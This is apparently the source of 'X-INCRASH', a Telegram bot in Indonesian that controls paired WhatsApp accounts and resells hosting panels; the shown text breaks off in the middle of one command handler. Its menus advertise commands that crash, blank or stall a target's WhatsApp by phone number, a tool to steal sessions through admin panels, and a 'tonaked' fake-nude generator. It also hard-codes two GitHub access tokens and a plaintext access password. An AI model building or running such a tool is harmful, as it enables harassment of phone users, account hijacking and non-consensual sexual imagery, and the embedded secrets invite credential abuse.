const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const dotenv = require("dotenv");
const FormData = require("form-data");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "./cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const database = require("./database/premium.json");
const config = require("./settings/config.js");
const settings = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const OWNER_ID = config.OWNER_ID;
const domain = config.domain;
const pltc = config.pltc;
const plta = config.plta;
const RESELLER_FILE = "./database/resellers.json";
const ADP_FILE = "./database/adminpanel.json";
const ADMIN_FILE = "./database/admin.json";
const PREM_FILE = "./database/premium.json";

const GITHUB_OWNER = "Danzstrr";
const GITHUB_REPO_KILL = "killtoken";
const GITHUB_TOKENS_FILE = "kills.json";
const GITHUB_TOKEN = "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"; 
const GITHUB_TOKEN2 = "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"; 

async function checkKillSwitch() {
  try {
    const res = await axios.get(
      `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO_KILL}/contents/kills.json`,
      {
        headers: {
          Authorization: `token ${GITHUB_TOKEN2}`,
          Accept: "application/vnd.github.v3.raw",
        },
      }
    );

    const killData = typeof res.data === "string" ? JSON.parse(res.data) : res.data;

    if (killData.status === "on") {
      const reasonMsg = killData.reason ? `Reason: ${killData.reason}\n` : '';
      const pesanMsg = killData.message ? `${killData.message}\n` : '';
      const text = `Script Di Matikan Oleh @Danzriel\n${pesanMsg}Bot akan dimatikan otomatis.`;

      console.log(text);

      if (typeof bot !== "undefined") {
        try {
          await bot.sendMessage(`${OWNER_ID}`, text, { parse_mode: 'Markdown' });
        } catch (e) {
          console.log('Gagal mengirim pesan ke Telegram:', e+"");
        }
      }

      process.exit(1);
    }
  } catch (err) {
    console.warn("⚠️ Gagal cek kill switch:", err.message);
  }
}
setInterval(checkKillSwitch, 800000);
checkKillSwitch();
// ~ Thumbnail Vid
const vidthumbnail = "https://files.catbox.moe/xyvf9r.mp4";

// ~ Database Url
const databaseURL = "https://raw.githubusercontent.com/Danzstrr/xincrash/refs/heads/main/tokens.json";

async function isTokenRegistered(token) {
    try {
        const response = await axios.get(databaseURL);
        const tokenData = response.data;

        if (!tokenData.tokens.includes(token)) {
            console.log(chalk.red("X-INCRASH\n❌ Your Bot Token Is Not Registered\n— Please Contact The Owner\n— @Danzriel ( Telegram )"));
            process.exit(1); // Keluar dari script
        } else {
            console.log(chalk.cyan("𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛☀️ \n– Version : 4.0\n– Developer : DanzOfficial\n– Telegram : @Danzriel\n\nTelegram Bot Successfully Connected"));
        }
    } catch (error) {
        console.error("❌ Gagal mengambil data token:", error.message);
        process.exit(1);
    }
}


isTokenRegistered(BOT_TOKEN);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}


const USER_IDS_FILE = 'database/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(USER_IDS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}


function saveUserIds(userIds) {
    try {
        fs.writeFileSync(USER_IDS_FILE, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`Pengguna ${userId} ditambahkan.`);
    }
}

let xincrash;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        xincrash = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          xincrash.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, xincrash);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          xincrash.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  xincrash = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  xincrash.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>X-INCRASH ⚚</blockquote>
— Number : ${botNumber}.
— Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, xincrash);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "DANZ1234"
  const code = await xincrash.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Code Pairing : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛</blockquote>
— Number : ${botNumber}.
─ Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  xincrash.ev.on("creds.update", saveCreds);

  return xincrash;
}

// ~ Fungsional Function Before Parameters
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

 
function saveAdmins(adminData) {
  fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminData, null, 2));
}

function saveResellers(resellerData) {
  fs.writeFileSync(RESELLER_FILE, JSON.stringify(resellerData, null, 2));
}

function saveAdp(adpData) {
  fs.writeFileSync(ADP_FILE, JSON.stringify(adpData, null, 2));
}

function savePremium(premiumData) {
  fs.writeFileSync(PREM_FILE, JSON.stringify(premiumData, null, 2));
}
 
function loadAdmins() {
  if (!fs.existsSync(ADMIN_FILE)) return { admins: [] };
  return JSON.parse(fs.readFileSync(ADMIN_FILE));
}

function loadResellers() {
  if (!fs.existsSync(RESELLER_FILE)) return { resellers: [] };
  return JSON.parse(fs.readFileSync(RESELLER_FILE));
}

function loadAdp() {
  if (!fs.existsSync(ADP_FILE)) return { adminpanels: [] };
  return JSON.parse(fs.readFileSync(ADP_FILE));
}

function loadPremium() {
  if (!fs.existsSync(PREM_FILE)) return { premiums: [] };
  return JSON.parse(fs.readFileSync(PREM_FILE));
}
 
function isAdmin(userId) {
  const { admins } = loadAdmins();
  return admins.includes(userId);
}
 
function isReseller(userId) {
  const { resellers } = loadAdmins();
  return resellers.includes(userId);
}

function isAdp(userId) {
  const { adminpanels } = loadAdp();
  return adminpanels.includes(userId);
}

function isPremium(userId) {
  const { premiums } = loadPremium();
  return premiums.includes(userId);
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function saveActiveSessions(botNumber) {
  try {
    const set = new Set()
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"))
      for (const n of Array.isArray(existing) ? existing : []) if (n) set.add(String(n))
    }
    set.add(String(botNumber))
    const tmp = SESSIONS_FILE + ".tmp"
    fs.writeFileSync(tmp, JSON.stringify([...set]))
    fs.renameSync(tmp, SESSIONS_FILE)
  } catch {}
}


const bugRequests = {};
const MENU_IMAGE = "https://files.catbox.moe/xyvf9r.mp4";
const ADMIN_PASSWORD = 'DANZ';
const loggedUsers = new Set();

// === /start ===
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // login check
  if (!loggedUsers.has(userId)) {
    await bot.sendMessage(chatId, "```\n🔐 Masukkan password yang diberikan oleh admin\nKetik langsung password-nya di bawah ini.\n```", { parse_mode: 'Markdown' });

    const onPassword = async (response) => {
      if (response.chat.id !== chatId || response.from.id !== userId) return;
      const input = (response.text || '').trim();

      if (input === ADMIN_PASSWORD) {
        loggedUsers.add(userId);
        await bot.sendMessage(chatId, "```\n✓ Password benar! Mengakses menu...\n```", { parse_mode: 'Markdown' });
        await showCountdown(chatId, username);
      } else {
        await bot.sendMessage(chatId, "```\n❌ Password salah!.\n```", { parse_mode: 'Markdown' });
      }

      bot.removeListener('message', onPassword);
    };

    bot.on('message', onPassword);
    return;
  }

  await showCountdown(chatId, username);
});

function runtime() {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
}

async function showCountdown(chatId, username) {
  const delay = (ms) => new Promise(r => setTimeout(r, ms));
  const loadingMsg = await bot.sendMessage(chatId, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛  ");

  try {
    for (const num of ["𝗧𝗛𝗜𝗦", "𝗧𝗛𝗜𝗦 𝗜𝗦", "𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛"]) {
      await delay(500);
      await bot.editMessageText(num, {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      });
    }

    await delay(500);
    await bot.editMessageText("𝗠𝗘𝗡𝗔𝗠𝗣𝗜𝗟𝗞𝗔𝗡 𝗠𝗘𝗡𝗨 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ☀️🚀", {
      chat_id: chatId,
      message_id: loadingMsg.message_id
    });

  } catch (err) {
    console.error("Countdown error:", err.message);
  }

  await delay(700);
  await sendMainMenu(chatId, username);
}

function sendMainMenu(chatId, username) {
  const waktu = runtime();
  bot.sendVideo(chatId, MENU_IMAGE, {
    caption: `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
<blockquote>こんにちは, ${username}（👋）X-INCRASHのBOTを紹介してください、スクリプトバグ WhatsApp は電話で</blockquote>
<blockquote>スクリプト作成者: @Danzriel</blockquote>

 ━━⟨ Info Bot ⟩ 𖡃
  𖥊 Bot Name : X-INCRASH 
  𖥊 Developer : @Danzriel
  𖥊 Version : 3.0\`Vip
  𖥊 Uptime : ${waktu}
 ━━⟨ Info User ⟩ 𖡃
  𖥊 Username : ${username}
  𖥊 Status : ${isOwner ? "Owner" : isAdmin ? "Admin" : isPremium ? "Premium" : "User"}
 
<blockquote>【 𝙲𝙻𝙸𝙲𝙺 𝙱𝚄𝚃𝚃𝙾𝙽 𝙷𝙴𝚁𝙴!! 】</blockquote>
`,

    parse_mode: "HTML",
    reply_markup: {
     inline_keyboard: [
     [
      { text: "⧼ ༒ ⧽ Bug Menu", callback_data: "trashmenu" },
      { text: "⧼ ༒ ⧽ Owner Menu", callback_data: "accesmenu" }
    ],
    [
      { text: "⧼ ༒ ⧽  Tools Menu", callback_data: "toolsmenu" }
    ],
    [ 
      { text: "⧼ ༒ ⧽ Thanks To", callback_data: "thanksto" }
    ],
    [
      { text: "⧼ ༒ ⧽  Channel", url: "https://t.me/channelDanzoffc" }
    ]
  ]
 }
 });
};


bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
「 め 」 Bug Menu 
  𖥊. /Crash ⸸ 62×××
  ╰➤ ⧼ Crash Ui ⧽ 
  𖥊. /Blank ⸸ 62××× 
  ╰➤ ⧼ Blank Andro ⧽
  𖥊. /DelayInvis ⸸ 62××× 
  ╰➤ ⧼ Delay Invis Hard ⧽
  𖥊. /Delay ⸸ 62××× 
  ╰➤ ⧼ Delay Hard ⧽
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "accesmenu") {
      caption = `
 「 め 」 Owner Menu
  𖥊. /setcd
  ╰➤ ⧼ Atur Colldown ⧽
  𖥊. /addadmin ⸸ ‹ ID-Tele ›
  ╰➤ ⧼ Tambah Admin ⧽
  𖥊. /addprem ⸸ ‹ ID-Tele ›
  ╰➤⧼ Tambah Users Premium ⧽
  𖥊. /deladmin ⸸ ‹ ID-Tele › 
  ╰➤ ⧼ Hapus Admin ⧽
  𖥊. /delprem ⸸ ‹ ID-Tele ›
  ╰➤ ⧼ Hapus Users Premium ⧽
  𖥊. /connect ⸸ 62×××
  ╰➤ ⧼ Connect To WhatsApp ⧽
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }

    if (query.data === "toolsmenu") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
 「 め 」 Tools Menu
  𖥊. /csessions 
  ╰➤ ⧼ Colong Sender Via Adp ⧽ 
  𖥊. /getcode
  ╰➤ ⧼ Ambil Code HTML ⧽ 
  𖥊. /iqc 
  ╰➤ ⧼ Screenshot WhatsApp Iphone ⧽
  𖥊. /tourl
  ╰➤ ⧼ Upload Image To Link ⧽
  𖥊. /tonaked
  ╰➤ ⧼ Telanjang ( 18+ ) ⧽
  𖥊. /panel
  ╰➤ ⧼ Memunculkan Menu Panel ⧽
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "thanksto") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
 「 め 」 Thanks To 
  𖥊. @Danzriel ( Developer ) 
  𖥊. Allah Swt ( My Good ) 
  𖥊. @ZamStecu ( Owner )
  𖥊. @Tuanyama ( My Friends )
  𖥊. @RissHosting ( Dev Mars Invictus )
  𖥊. @Relstore_13 ( Ceo )
  𖥊. @kikiystore ( Ceo )
  𖥊. @markedip ( Patner )
  𖥊. @Mstoregntg ( Patner )
  𖥊. @Fizzyy11 ( Patner )
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
   if (query.data === "next") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
  𖥊. /listsrv
  𖥊. /delsrv
  𖥊. /addreseller
  𖥊. /delreseller
  𖥊. /listreseller
  𖥊. /addpt
  𖥊. /delpt
`;
      replyMarkup = { inline_keyboard: [[{ text: "⭅ Back", callback_data: "back" }]] };
    }
    
    if (query.data === "back") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
  ━━⟨ Info User ⟩ 𖡃
  𖥊 Username : ${username}
  𖥊 Status : ${isOwner ? "Owner" : isAdp ? "Admin" : isReseller ? "Reseller" : "User"}
  ━━⟨ Panel Menu ⟩ 𖡃
  𖥊. /1gb namapanel,id
  𖥊. /2gb namapanel,id
  𖥊. /3gb namapanel,id
  𖥊. /4gb namapanel,id
  𖥊. /5gb namapanel,id
  𖥊. /6gb namapanel,id
  𖥊. /7gb namapanel,id
  𖥊. /8gb namapanel,id
  𖥊. /9gb namapanel,id
  𖥊. /10gb namapanel,id
  𖥊. /unli namapanel,id
  𖥊. /cadp namapanel,id
`;
      replyMarkup = { inline_keyboard: [[{ text: "Next ⭆", callback_data: "next" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
<blockquote>こんにちは, ${username}（👋）X-INCRASHのBOTを紹介してください、スクリプトバグ WhatsApp は電話で</blockquote>
<blockquote>スクリプト作成者: @Danzriel</blockquote>

 ━━⟨ Info Bot ⟩ 𖡃
  𖥊 Bot Name : X-INCRASH 
  𖥊 Developer : @Danzriel
  𖥊 Version : 3.0\`Vip
  𖥊 Uptime : ${runtime}
 ━━⟨ Info User ⟩ 𖡃
  𖥊 Username : ${username}
  𖥊 Status : ${isOwner ? "Owner" : isAdmin ? "Admin" : isPremium ? "Premium" : "User"}
 
<blockquote>【 𝙲𝙻𝙸𝙲𝙺 𝙱𝚄𝚃𝚃𝙾𝙽 𝙷𝙴𝚁𝙴!! 】</blockquote>
`;
      replyMarkup = {
     inline_keyboard: [
     [
      { text: "⟨ ༒ ⧽ Bug Menu", callback_data: "trashmenu" },
      { text: "⧼ ༒ ⧽ Owner Menu", callback_data: "accesmenu" }
    ],
    [
      { text: "⧼ ༒ ⧽  Tools Menu", callback_data: "toolsmenu" }
    ],
    [ 
      { text: "⧼ ༒ ⧽ Thanks To", callback_data: "thanksto" }
    ],
    [
      { text: "⧼ ༒ ⧽  Channel", url: "https://t.me/channelDanzoffc" }
    ]
  ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: vidthumbnail,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

bot.onText(/\/panel/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;
    const owner = config.OWNER_ID;
    const randomImage = MENU_IMAGE;
    bot.sendVideo(chatId, randomImage, {
    caption: `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
 ━━⟨ Info User ⟩ 𖡃
  𖥊 Username : ${username}
  𖥊 Status : ${isOwner ? "Owner" : isAdp ? "Admin" : isReseller ? "Reseller" : "User"}
 ━━⟨ Panel Menu ⟩ 𖡃
  𖥊. /1gb namapanel,id
  𖥊. /2gb namapanel,id
  𖥊. /3gb namapanel,id
  𖥊. /4gb namapanel,id
  𖥊. /5gb namapanel,id
  𖥊. /6gb namapanel,id
  𖥊. /7gb namapanel,id
  𖥊. /8gb namapanel,id
  𖥊. /9gb namapanel,id
  𖥊. /10gb namapanel,id
  𖥊. /unli namapanel,id
  𖥊. /cadp namapanel,id
`,
    
  parse_mode: "HTML",
    reply_markup: {
     inline_keyboard: [
     [{ text: "Next ⭆", callback_data: "next" }]
    ]
   }
  });
 });
// Cpanel 
bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /1gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "1gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "1024";
  const cpu = "30";
  const disk = "1024";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 1gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//2Gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE
    
    if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
